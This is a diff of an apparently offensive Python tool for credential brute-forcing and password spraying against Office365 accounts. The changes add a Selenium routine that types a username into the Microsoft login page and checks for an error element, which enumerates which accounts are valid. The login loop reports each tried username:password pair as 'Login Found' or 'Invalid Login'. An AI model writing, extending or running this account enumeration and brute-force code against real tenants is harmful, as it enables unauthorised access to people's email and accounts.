@@ -55,8 +55,12 @@ d8888b.  .d88b.  db    db d8b   db d8888b.  .d88b.
         
     
 def brute_office(username,password):
-    
-    if check_o365(username):
+
+    check_user = check_o365(username)
+    if(check_user == None):
+        print(Fore.RED+"[+] Error! Target does not seem to be using Office365")
+        sys.exit(0)
+    elif (check_user == True):
         #TODO: run bruter
         header = {"MS-ASProtocolVersion": "14.0"
             }
@@ -71,10 +75,13 @@ def brute_office(username,password):
         color = Fore.GREEN+"Login Found: " if r.status_code == 200 else Fore.RED+"Invalid Login: "
         print(color+"{}:{} - {}".format(username,password,STATUS_CODES[str(r.status_code)]))
         
-        
-    else:
-        print(Fore.RED+"[+] Error! Unknown error code. Target does not seem to be using Office365")
+    elif(check_user == False):
+        print(Fore.RED+"[+] Error! Invalid username")  
         sys.exit(0)
+    else:
+        print(Fore.RED+"[+] Error! Unknown Error")
+        sys.exit(0)
+        
 
 
 def sprayAD(host):
@@ -82,7 +89,6 @@ def sprayAD(host):
     pass
 
 def check_o365(username):
-    iso365 = False
     domain = username.split('@')[1].replace('.', '-')
     url_dict = {
         "Global Office365": ".mail.protection.outlook.com",
@@ -92,12 +98,19 @@ def check_o365(username):
     for line in url_dict:
         try:
             socket.gethostbyname(domain + url_dict[line])
-            iso365 = True
-            return True
+            driver = webdriver.Chrome()
+            driver.get("https://login.microsoftonline.com")
+            element = driver.find_element_by_name("loginfmt")
+            element.send_keys(username)
+            element.send_keys(Keys.RETURN)
+            time.sleep(1)
+            try:
+                driver.find_element_by_id("usernameError")
+                return False
+            except:
+                return True
         except:
             pass
-    if not iso365:
-        return False
 
 
 def get_credentials(auth):
